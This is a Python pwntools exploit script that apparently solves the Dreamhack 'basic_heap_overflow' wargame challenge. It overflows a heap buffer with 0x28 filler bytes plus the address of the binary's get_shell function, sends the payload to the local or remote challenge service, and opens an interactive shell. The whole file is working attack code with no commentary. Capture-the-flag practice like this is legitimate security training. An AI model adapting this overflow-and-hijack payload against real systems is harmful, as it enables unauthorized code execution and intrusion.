from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',15120)
elif sys.argv[1]=="-l":
    p = process('basic_heap_overflow')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('basic_heap_overflow')

get_shell=e.symbols['get_shell']

log.info("get_shell address: "+hex(get_shell))

payload="A"*0x28
payload+=p32(get_shell)

p.sendline(payload)

p.interactive()